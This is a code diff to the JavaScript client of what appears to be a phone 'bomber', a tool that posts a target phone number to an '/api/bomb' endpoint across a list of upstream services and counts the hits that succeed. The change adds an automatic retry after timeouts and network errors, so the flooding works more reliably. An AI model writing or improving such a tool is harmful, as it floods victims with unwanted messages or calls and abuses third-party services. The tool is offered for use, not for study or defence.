@@ -40,11 +40,13 @@ async function fetchEndpoints() {
   return data.endpoints || [];
 }
 
-async function fireOne(endpointId, phone) {
+async function fireOne(endpointId, phone, retries = 1) {
   if (!running) return;
 
   stats.active++;
   renderStats();
+
+  let shouldRetry = false;
 
   try {
     const res = await fetch('/api/bomb', {
@@ -59,6 +61,12 @@ async function fireOne(endpointId, phone) {
     if (data.ok) {
       stats.sent++;
       log(`✓ ${endpointId} → ${data.upstreamStatus} (${data.latencyMs}ms)`, 'ok');
+    } else if (
+      (data.upstreamStatus === 'timeout' || data.upstreamStatus === 'network_error') &&
+      retries > 0
+    ) {
+      shouldRetry = true;
+      log(`↻ ${endpointId} → retry after ${data.upstreamStatus}`, 'info');
     } else {
       stats.fail++;
       log(`✗ ${endpointId} → ${data.upstreamStatus} (${data.latencyMs}ms)`, 'fail');
@@ -73,6 +81,11 @@ async function fireOne(endpointId, phone) {
   } finally {
     stats.active--;
     renderStats();
+  }
+
+  if (shouldRetry) {
+    await new Promise(r => setTimeout(r, 500));
+    return fireOne(endpointId, phone, retries - 1);
   }
 }
 
